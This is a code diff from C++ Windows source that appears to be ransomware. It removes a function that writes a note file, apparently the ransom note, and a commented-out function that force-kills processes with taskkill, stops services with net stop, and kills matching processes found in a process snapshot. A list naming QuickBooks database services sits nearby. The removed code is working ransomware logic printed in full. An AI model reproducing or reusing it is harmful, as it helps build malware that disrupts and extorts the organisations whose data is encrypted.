@@ -92,20 +92,7 @@ config_params default_parameters = {
 NTrueDrbg g_drbg;
 
 
-std::wstring wNoteString;
-void makeNote(LPCWSTR notePath) 
-{
-	DWORD dwWritten;
-	HANDLE fileHandle = CreateFileW(notePath, GENERIC_WRITE, 0, nullptr, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, nullptr);
-	if (fileHandle == INVALID_HANDLE_VALUE) {
-		if (GetLastError() != ERROR_FILE_EXISTS)
-			dbg(LEVEL1, "Note create failed %S, error=%u", notePath, GetLastError());
-		return;
-	}
 
-	WriteFile(fileHandle, wNoteString.c_str(), (wNoteString.length() * 2), &dwWritten, nullptr);
-	CloseHandle(fileHandle);
-}
 
 
 
@@ -241,57 +228,8 @@ L"QuickBooksDB23",
 L"QuickBooksDB24",
 L"QuickBooksDB25",
 };
-
-
-
-/*
-void TerminateActiveProcessList() {
-
-	WCHAR params[512];
-
-	for (int i = 0; i < ARRAYSIZE(lpwTaskkill); i++) {
-		wsprintfW(params, L"/f /im \"%s\"", lpwTaskkill[i]);
-		ShellExecuteW(0, L"open", L"taskkill.exe", params, NULL, SW_SHOWNORMAL);
-		Sleep(50);
-	}
-
-	for (int i = 0; i < ARRAYSIZE(lpwNetStop); i++) {
-		wsprintfW(params, L"stop \"%s\"", lpwNetStop[i]);
-		ShellExecuteW(0, L"open", L"net.exe", params, NULL, SW_SHOWNORMAL);
-		Sleep(50);
-	}
-
-	HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-	if (hSnap != INVALID_HANDLE_VALUE) {
-
-		PROCESSENTRY32 pe = { 0 };
-		pe.dwSize = sizeof(pe);
-
-		if (Process32FirstW(hSnap, &pe)) {
-			do {
-
-				for (int i = 0; i < ARRAYSIZE(szwProcessNamesList); i++)
-				{
-#ifdef _DEBUG
-					if (lstrcmpiW(pe.szExeFile, L"calculator.exe") != 0)
-						continue;
-#endif
-					if (StrStrIW(szwProcessNamesList[i], pe.szExeFile) != NULL && pe.th32ProcessID > 1000)
-					{
-						wsprintfW(params, L"/f /PID \"%u\"", pe.th32ProcessID);
-						for (int i = 0; i < 1; i++) {
-							ShellExecuteW(0, L"open", L"taskkill.exe", params, nullptr, SW_SHOWNORMAL);
-						}
-						break;
-					}
-				}
-			} while (Process32Next(hSnap, &pe));
-
-		}
-		CloseHandle(hSnap);
-	}
-}
 */
+
 
 
 HANDLE hMutex = nullptr;
